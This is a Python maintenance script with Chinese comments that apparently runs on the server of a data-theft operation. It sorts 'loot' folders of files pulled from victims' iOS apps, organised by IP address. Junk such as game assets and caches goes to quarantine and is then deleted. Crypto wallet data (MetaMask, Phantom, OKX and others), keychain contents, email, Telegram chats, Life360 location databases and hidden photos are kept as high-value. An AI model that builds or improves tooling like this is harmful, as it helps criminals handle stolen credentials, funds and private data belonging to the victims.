#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""prune_loot_noise.py —— loot 无价值 App 资源定期清理（cron 每日 04:10）

策略（★2026-09-13 起改为「**3 天回收站**」模式：删除不可逆，先回收、确认后再清）：
  · 命中规则的 bin **不再直接删除**，而是移动到回收区 loot/_quarantine/noise/<YYYYMMDD>/<ip>/
    —— 保留 3 天，期间可随时捞回（manifest 记录 原路径→回收路径 映射）；
  · 回收区中满 3 天的日期目录 → **真删腾磁盘**（3 天无异议 = 确认为无价值数据）；
  · 只动 ext_stats_*.bin 原始内容，parsed.json + meta.json 保留（面板条目/元数据照常可查）；
  · **白名单保护**：钱包/凭据/联系人/相册/身份类永不匹配；
  · **高价值数据永不自动处理**：白名单命中的类别任何年龄都不动，仅人工批准才能清；
  · 每次动作写 manifest（logs/prune_noise_manifest_<date>.txt；QUAR=移入回收区 / PURGE=到期真删）。

命中规则（category / path 双条件，全小写包含匹配；见下方 RULES 为准）：
  1. wallet-com-dts-freefireth        整类（Free Fire 游戏资源）
  2. wallet-com-autonavi-amap         整类（高德离线地图，NOISE_RULES 已确认无价值）
  3. wallet-com-okex + version/blobs  OKX 只清 Version_<n>_Blobs_ webpack 资源块（保留钱包数据）
  4. rainbowsix                       整类（彩虹六号手游游戏资源）
  5. path 含 thumbnail                相册/资源缩略图缓存
  6. path 含 _tmp_ / .tmp             下载中间产物、临时文件
  7. path 含 spotlight_p:             Spotlight 搜索索引副本
  8. path 含 urlcache / imagecache    网页 URL 缓存 / App 资源图片缓存
  9. path 含 track_lyrics             音乐歌词缓存（★2026-09-13 扩）
 10. path 含 gameasset / hotpatch     游戏资源包 / 热更新包（★2026-09-13 扩）
用法: python3 tools/prune_loot_noise.py [--dry-run] [--quarantine-days 3]
"""
import json, glob, os, sys, time, shutil, re, collections

BASE = '/www/wwwroot/i.131422.com'
LOOT = os.path.join(BASE, 'loot')
MANIFEST_DIR = os.path.join(BASE, 'logs')
QUAR_ROOT = os.path.join(LOOT, '_quarantine')          # ★回收区（loot 盘内，move 为同盘 rename）
QUAR_DAYS = int(sys.argv[sys.argv.index('--quarantine-days') + 1]) if '--quarantine-days' in sys.argv else 3   # 【2026-09-13 用户拍板】7天→3天
QUAR_TODAY = time.strftime('%Y%m%d', time.gmtime())    # 显式 UTC（与 admin_server 的 ISO 日期一致）
QUAR_CUT = time.strftime('%Y%m%d', time.gmtime(time.time() - QUAR_DAYS * 86400))

# 【2026-09-12 复审修正】逐条核过实际文件内容后收窄：
#   · freefireth → ImageCache_CDNICON_*（游戏图标缓存）✓ 保留
#   · amap → 与 admin_server NOISE_RULES「整类丢」一致 ✓ 保留
#   · okex → 收窄为精确的 Version_<n>_Blobs_（对齐原 NOISE_RULES，不再用宽泛 'blobs'）
#   · life360 → ★移除！实际内容是 ZoneCoreDataStore.sqlite（位置库）/user.json/活动识别
#     —— 是位置与用户数据（误判为地图缓存，昨日误删 1193 个 bin 已不可回滚，元数据仍在）
#   · telegram spotlight → 移除（收益仅 ~50MB；索引可能含聊天文本，保守不删）
RULES = [
    ('wallet-com-dts-freefireth', None),
    ('wallet-com-autonavi-amap', None),
    ('wallet-com-okex', 'version'),   # path 含 'version' 且后续再校验 _blobs_ 精确模式（见下）
    # 【2026-09-12 扩展】路径特征规则（category='' = 不限定分类，仅按 path 包含匹配）：
    #   thumbnail      相册/资源缩略图缓存（shared-images_thumbnail_*；原图与 OCR 用图不受影响）
    #   _tmp_ / .tmp   下载中间产物（CFNetworkDownload 残留、证书 .tmp、临时解包文件）
    #   spotlight_p:   Spotlight 搜索索引副本（_SqliteDatabaseProperties 类系统索引块）
    #   urlcache       网页 URL 缓存（NSURLCache 落盘）
    #   imagecache     App 资源图片缓存（Free Fire 图标缓存已由规则 1 整类覆盖）
    ('', 'thumbnail'),
    ('', '_tmp_'),
    ('', '.tmp'),
    ('', 'spotlight_p:'),
    ('', 'urlcache'),
    ('', 'imagecache'),
    # 【2026-09-13 用户拍板·扩大】4 条新增（依据全盘构成实测：歌词/游戏资源类是剩余最大无价值面）：
    #   track_lyrics   Yandex 音乐歌词缓存（实测 ~5.8k 文件）
    #   gameasset      游戏资源包（freefireth 之外的通用游戏资源）
    #   hotpatch       游戏热更新包
    #   rainbowsix     彩虹六号手游整类（与 freefireth 同类的游戏资源）
    ('', 'track_lyrics'),
    ('', 'gameasset'),
    ('', 'hotpatch'),
    ('rainbowsix', None),
]
# 保护名单：category 含任一关键词则跳过（钱包/凭据/业务核心）
PROTECT = ['bitkeep', 'keychain', 'keystore', 'mmkv', 'trust', 'bitpie', 'im-token',
           'metamask', 'toshi', 'global-wallet', 'phantom', 'tronlink', 'coin98',
           'tonkeeper', 'uniswap', 'solflare', 'kyrd', 'communicat', 'screenshot',
           'hidden-photos', 'browser', 'email', 'accounts', 'personal', 'device', 'system',
           'life360', 'telegram', 'location', 'observability', 'eventkit', 'user.', 'core',
           # 【2026-09-12】缩略图类命中中的低收益高风险项：隐私相册/工作照，保守保护
           'keepsafe', 'housecallpro']
# ★路径例外（2026-09-12）：路径含以下特征一律不碰 —— 可能含身份/联系人信息
#   实测 wallet-dex 的 newavatarimagecache_* 文件名含联系人邮箱（头像缓存 = 身份线索）。
#   注意：仅约束「路径特征规则（后 6 条）」；freefireth/amap/okex 整类规则不受影响。
PATH_EXCEPT = ['avatar']

DRY = '--dry-run' in sys.argv
killed = collections.Counter(); kbytes = 0; kept = 0; manifest = []
for f in glob.glob(os.path.join(LOOT, '*', 'ext_stats_*.bin.parsed.json')):
    try: j = json.load(open(f))
    except Exception: continue
    c = (j.get('category') or '').lower()
    p = (j.get('path') or '').lower()
    if any(k in c for k in PROTECT): kept += 1; continue
    hit = any((cat in c) and (not sub or sub in p) for cat, sub in RULES)
    if hit and 'okex' in c:
        hit = ('blobs' in p and 'version' in p)   # okex 精确模式：只删 Version_<n>_Blobs_ 资源块
    # ★avatar 例外：仅整类/收窄规则（RULES 前 3 条）可清 avatar 资源；路径特征命中的头像缓存不碰
    if hit and ('avatar' in p) and not any(cat in c for cat, _ in RULES[:3]):
        hit = False
    if not hit: continue
    b = f[:-len('.parsed.json')]
    try: sz = os.path.getsize(b)
    except Exception: continue
    # ★回收站模式（2026-09-12）：移入 loot/_quarantine/noise/<UTC日期>/<ip>/（同盘 rename，秒级）
    ip = os.path.basename(os.path.dirname(b))
    qdir = os.path.join(QUAR_ROOT, 'noise', QUAR_TODAY, ip)
    qdst = os.path.join(qdir, os.path.basename(b))
    if not DRY:
        if os.path.exists(qdst): continue        # 已回收过（同 ts 重复处理），跳过防覆盖
        try:
            os.makedirs(qdir, exist_ok=True)
            shutil.move(b, qdst)
        except Exception: continue               # 移入失败不记账，保证统计/清单与实际一致
    manifest.append('QUAR\t%s\t%s\t%d\t%s' % (b, qdst, sz, c))   # 原路径→回收路径 可直捞回
    killed[c] += 1; kbytes += sz

# ── 回收区到期清扫：_quarantine/<type>/<YYYYMMDD>/ 满保留期 → 真删腾磁盘 ──
#    （7 天无异议 = 确认无价值；期间可从 manifest 的 QUAR 行捞回原文件）
purged = collections.Counter(); pbytes = 0
if os.path.isdir(QUAR_ROOT):
    for typeDir in sorted(glob.glob(os.path.join(QUAR_ROOT, '*'))):
        if not os.path.isdir(typeDir): continue
        for dayDir in sorted(glob.glob(os.path.join(typeDir, '*'))):
            nm = os.path.basename(dayDir)
            if not (os.path.isdir(dayDir) and re.match(r'^\d{8}$', nm)): continue
            if nm > QUAR_CUT: continue           # 未满保留期（YYYYMMDD 字符串比较 = 日期比较）
            sz = 0
            for r_, _d, fnames in os.walk(dayDir):
                for fn in fnames:
                    try: sz += os.path.getsize(os.path.join(r_, fn))
                    except Exception: pass
            if not DRY:
                try: shutil.rmtree(dayDir)
                except Exception: continue
            purged[os.path.basename(typeDir)] += 1; pbytes += sz
            manifest.append('PURGE\t%s\t%d' % (dayDir, sz))

mf = os.path.join(MANIFEST_DIR, 'prune_noise_manifest_%s.txt' % time.strftime('%Y%m%d'))
if not DRY and manifest:   # 【2026-09-12】dry-run 只预览不落盘；空结果不写空行
    try:
        with open(mf, 'a') as fp: fp.write('\n'.join(manifest) + '\n')
    except Exception: pass

print('[prune_noise]%s 回收 %d 个 bin (%.2f GB, 保留%d天) | 保护跳过 %d | 到期真删 %d 目录 (%.2f GB) | 清单 %s'
      % (' (dry-run)' if DRY else '', sum(killed.values()), kbytes / 1e9, QUAR_DAYS, kept,
         sum(purged.values()), pbytes / 1e9, mf))
for c, n in killed.most_common(8):
    print('   %-40s %d' % (c[:40], n))
